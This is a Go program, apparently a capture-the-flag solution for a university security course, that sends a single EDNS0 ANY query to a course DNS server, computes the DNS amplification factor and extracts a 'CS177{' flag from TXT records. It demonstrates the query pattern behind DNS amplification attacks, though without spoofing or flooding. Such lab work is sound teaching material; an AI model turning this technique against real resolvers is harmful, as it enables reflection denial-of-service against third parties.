package main

import (
	"fmt"
	"log"
	"strings"

	"github.com/miekg/dns"
)

func main() {
	dnsServer := "cs177.seclab.cs.ucsb.edu:48395"
	fmt.Printf("Connecting to DNS server: %s\n\n", dnsServer)

	// DNS amplification
	dnsAmplification, flag, err := performDNSAmplification(dnsServer)
	if err != nil {
		log.Printf("DNS amplification error: %v", err)
	} else {
		fmt.Printf("\nFinal results:\n")
		fmt.Printf("DNS amplification factor: %.2f\n", dnsAmplification)
		if flag != "" {
			fmt.Printf("Flag found: %s\n", flag)
		} else {
			fmt.Println("No flag found in the response.")
		}
	}
}

func performDNSAmplification(server string) (float64, string, error) {
	c := new(dns.Client)
	c.Net = "udp"

	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn("amplifiedsecurity.com"), dns.TypeANY)
	m.SetEdns0(4096, true)

	fmt.Println("Sending DNS query:")
	fmt.Printf("Question: %v\n", m.Question)
	fmt.Printf("EDNS0: %v\n", m.IsEdns0())
	fmt.Printf("Request size: %d bytes\n", m.Len())

	r, rtt, err := c.Exchange(m, server)
	if err != nil {
		return 0, "", err
	}

	fmt.Println("\nReceived DNS response:")
	fmt.Printf("Response time: %v\n", rtt)
	fmt.Printf("Response size: %d bytes\n", r.Len())
	fmt.Printf("Response code: %v\n", r.Rcode)
	fmt.Printf("Answer section: %d records\n", len(r.Answer))
	fmt.Printf("Authority section: %d records\n", len(r.Ns))
	fmt.Printf("Additional section: %d records\n", len(r.Extra))

	requestSize := m.Len()
	responseSize := r.Len()
	amplificationFactor := float64(responseSize) / float64(requestSize)

	fmt.Printf("\nAmplification factor: %.2f\n", amplificationFactor)

	fmt.Println("\nDetailed response:")
	for _, a := range r.Answer {
		fmt.Printf("Answer: %v\n", a)
	}
	for _, ns := range r.Ns {
		fmt.Printf("Authority: %v\n", ns)
	}
	for _, extra := range r.Extra {
		fmt.Printf("Additional: %v\n", extra)
	}

	flag := extractFlag(r)
	if flag != "" {
		fmt.Printf("\nFlag found: %s\n", flag)
	} else {
		fmt.Println("\nNo flag found in the response.")
	}

	return amplificationFactor, flag, nil
}

func extractFlag(r *dns.Msg) string {
	for _, answer := range r.Answer {
		if txt, ok := answer.(*dns.TXT); ok {
			for _, t := range txt.Txt {
				if strings.Contains(t, "CS177{") {
					return t
				}
			}
		}
	}
	return ""
}
